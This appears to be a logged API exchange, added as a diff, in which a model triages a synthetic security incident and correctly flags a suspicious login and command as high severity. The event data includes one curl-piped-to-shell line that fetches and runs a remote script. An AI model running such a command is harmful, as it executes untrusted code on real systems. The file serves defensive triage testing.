@@ -1,0 +1,46 @@
+{
+ "request": {
+  "model": "muse-spark-1.3",
+  "messages": [
+   {
+    "role": "system",
+    "content": "You are a SOC analyst. Answer with JSON only."
+   },
+   {
+    "role": "user",
+    "content": "Incident (synthetic). host web01.example.com; user svc-backup; src 192.0.2.10.\nevents:\n- e1 2026-01-01T10:00:01Z Authentication failure user svc-backup from 192.0.2.10\n- e2 2026-01-01T10:00:09Z Authentication success user svc-backup from 192.0.2.10\n- e3 2026-01-01T10:00:20Z Process Activity cmd_line 'curl http://198.51.100.7/a.sh | sh' by svc-backup\nReturn only JSON: {\"summary\": str, \"suspicious_event_uids\": [str], \"severity_suggestion\": \"low|medium|high\"}"
+   }
+  ],
+  "max_tokens": 3000
+ },
+ "status": 200,
+ "response": {
+  "id": "chatcmpl-01a189e4-7456-71fe-abb9-74d02997098e",
+  "choices": [
+   {
+    "finish_reason": "stop",
+    "index": 0,
+    "message": {
+     "content": "{\"summary\": \"svc-backup authenticated from 192.0.2.10 on web01.example.com after a failure then ran curl piped to shell to fetch and execute remote script from 198.51.100.7, indicating likely compromised account and remote code execution.\", \"suspicious_event_uids\": [\"e2\", \"e3\"], \"severity_suggestion\": \"high\"}",
+     "refusal": null,
+     "role": "assistant"
+    },
+    "logprobs": null
+   }
+  ],
+  "created": 1793314812,
+  "model": "muse-spark-1.3",
+  "object": "chat.completion",
+  "usage": {
+   "completion_tokens": 1126,
+   "prompt_tokens": 191,
+   "total_tokens": 1317,
+   "completion_tokens_details": {
+    "reasoning_tokens": 1036
+   },
+   "prompt_tokens_details": {
+    "cached_tokens": 0
+   }
+  }
+ }
+}
